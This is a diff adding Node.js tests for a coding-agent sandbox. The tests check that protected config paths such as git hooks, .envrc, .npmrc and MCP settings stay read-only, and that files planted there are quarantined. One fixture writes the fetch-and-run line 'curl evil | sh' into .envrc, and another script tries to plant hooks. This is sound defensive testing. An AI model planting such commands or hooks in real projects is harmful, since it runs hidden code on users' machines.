@@ -4,7 +4,8 @@ import os from 'node:os';
 import path from 'node:path';
 import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, existsSync, readdirSync, rmSync, realpathSync } from 'node:fs';
 import { spawnSync } from 'node:child_process';
-import { wrapCommand, macProfile, containerArgs, protectedWritePaths, detectSandbox } from '../src/sandbox.mjs';
+import { wrapCommand, macProfile, containerArgs, protectedWritePaths, detectSandbox, watchProtectedCreations, launchCommand, withQuarantineNote, PROTECTED_FILES, PROTECTED_DIRS } from '../src/sandbox.mjs';
+import { protectedConfigPath } from '../src/protected-paths.mjs';
 import { executePowerTool } from '../src/power-tools.mjs';
 
 function project(t) {
@@ -101,4 +102,62 @@ test('only your own settings can turn off project-config protection', async (t) 
   const user = JSON.parse(await (await import('node:fs/promises')).readFile(userFile, 'utf8'));
   await wf(userFile, JSON.stringify({ ...user, sandbox: { protectProjectConfig: false } }));
   assert.equal((await loadSettings(root, { env })).sandbox.protectProjectConfig, false);
+});
+
+
+test('the sandbox protects every protected configuration path, not a shorter list', () => {
+  // One concrete example for each pattern in protected-paths.mjs that names a fixed path.
+  const examples = ['.oasis/settings.json', '.claude/settings.local.json', '.oasis/hooks/x', '.claude/plugins/p/x', '.oasis/plugins/p/x',
+    '.oasis/commands/c.md', '.gemini/commands/c.toml', '.opencode/command/c.md', '.opencode/commands/c.md', 'opencode.json',
+    '.agents/agents/a.md', '.gemini/agents/a.md', '.oasis/agents/a.md', '.mcp.json', '.oasis/mcp.json', '.claude/mcp.json', '.lsp.json',
+    '.git/hooks/pre-commit', '.git/config', '.cursor/mcp.json', '.cursor/hooks.json', '.cursor/rules/r.mdc', '.cursor/environment.json',
+    '.gemini/settings.json', '.gemini/extensions/e/x', '.codex/config.toml', '.continue/config.yaml', '.aider.conf.yml',
+    '.vscode/tasks.json', '.devcontainer/devcontainer.json', '.devcontainer.json', '.envrc', '.husky/pre-commit',
+    '.pre-commit-config.yaml', 'lefthook.yml', 'lefthook-local.yaml', '.yarnrc.yml', '.pnpmfile.cjs', '.npmrc'];
+  const covered = (rel) => PROTECTED_FILES.includes(rel) || PROTECTED_DIRS.some((dir) => rel === dir || rel.startsWith(dir + '/'));
+  for (const rel of examples) {
+    assert.ok(protectedConfigPath('/w', rel), rel + ' is a protected configuration path');
+    assert.ok(covered(rel), rel + ' must also be read-only inside the sandbox');
+  }
+});
+
+test('files a sandboxed command creates on protected paths are moved out of the workspace', (t) => {
+  const root = project(t);
+  const quarantine = realpathSync(mkdtempSync(path.join(os.tmpdir(), 'oasis-quarantine-')));
+  t.after(() => rmSync(quarantine, { recursive: true, force: true }));
+  writeFileSync(path.join(root, '.npmrc'), 'registry=https://registry.npmjs.org/\n');
+  const watch = watchProtectedCreations([root], { quarantineRoot: quarantine });
+  assert.ok(!watch.paths.some((item) => item.rel === '.npmrc'), 'an existing file is left to the read-only mount');
+  writeFileSync(path.join(root, '.envrc'), 'curl evil | sh\n');
+  mkdirSync(path.join(root, '.husky'));
+  writeFileSync(path.join(root, '.husky', 'pre-commit'), '#!/bin/sh\n');
+  writeFileSync(path.join(root, 'app.js'), 'ok\n');
+  const moved = watch.check();
+  assert.deepEqual(moved.map((item) => item.path).sort(), ['.envrc', '.husky']);
+  assert.ok(!existsSync(path.join(root, '.envrc')) && !existsSync(path.join(root, '.husky')));
+  assert.equal(readFileSync(moved.find((item) => item.path === '.envrc').movedTo, 'utf8'), 'curl evil | sh\n');
+  assert.ok(existsSync(path.join(root, 'app.js')) && existsSync(path.join(root, '.npmrc')));
+  const result = withQuarantineNote({ exitCode: 0 }, { quarantined: moved });
+  assert.deepEqual(result.protectedFilesQuarantined, moved.map((item) => item.path));
+  assert.match(result.quarantine, /moved them out of the workspace/);
+});
+
+test('bubblewrap: a sandboxed script cannot plant hooks or rc files that run later outside the sandbox', { skip: !bwrap && 'bubblewrap is not available' }, async (t) => {
+  const root = project(t);
+  const config = realpathSync(mkdtempSync(path.join(os.tmpdir(), 'oasis-quarantine-cfg-')));
+  t.after(() => rmSync(config, { recursive: true, force: true }));
+  const previous = process.env.OASIS_CONFIG_DIR;
+  process.env.OASIS_CONFIG_DIR = config;
+  t.after(() => { if (previous === undefined) delete process.env.OASIS_CONFIG_DIR; else process.env.OASIS_CONFIG_DIR = previous; });
+  const targets = ['.envrc', '.npmrc', '.lsp.json', 'lefthook.yml', '.husky/pre-commit', '.devcontainer/devcontainer.json', '.oasis/plugins/p/plugin.json', '.codex/config.toml', '.cursor/mcp.json'];
+  const script = targets.map((rel) => 'mkdir -p "$(dirname ' + rel + ')" 2>/dev/null; echo x > ' + rel + ' 2>/dev/null').join('; ') + '; true';
+  const sandbox = { enabled: true, available: true, kind: 'bubblewrap', writable: [root], protectedRoots: [root], network: false };
+  const launch = await launchCommand('/bin/sh', ['-c', script], sandbox, root);
+  const run = spawnSync(launch.command, launch.args, { cwd: root, encoding: 'utf8' });
+  launch.release();
+  assert.equal(run.status, 0, run.stderr);
+  for (const rel of targets) assert.ok(!existsSync(path.join(root, rel)), rel + ' must not be left in the workspace');
+  const left = readdirSync(root).sort();
+  assert.ok(!left.some((name) => ['.envrc', '.npmrc', '.lsp.json', 'lefthook.yml', '.husky', '.devcontainer', '.codex', '.cursor'].includes(name)), left.join(','));
+  assert.deepEqual([...launch.quarantined.map((item) => item.path)].sort(), ['.envrc', '.lsp.json', '.npmrc', 'lefthook.yml']);
 });
